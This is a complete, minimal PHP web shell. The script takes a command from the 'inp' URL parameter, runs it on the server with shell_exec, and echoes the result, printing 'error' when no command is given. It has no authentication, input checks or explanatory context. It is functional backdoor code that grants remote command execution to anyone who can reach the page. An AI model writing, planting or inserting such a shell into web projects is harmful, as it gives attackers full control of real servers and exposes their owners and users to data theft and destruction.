<?php 
  if(isset($_GET['inp'])) {
      $txtinp = $_GET['inp'];
      $output = shell_exec($txtinp);
      echo $output;
  }
  else
    echo 'error';
?>
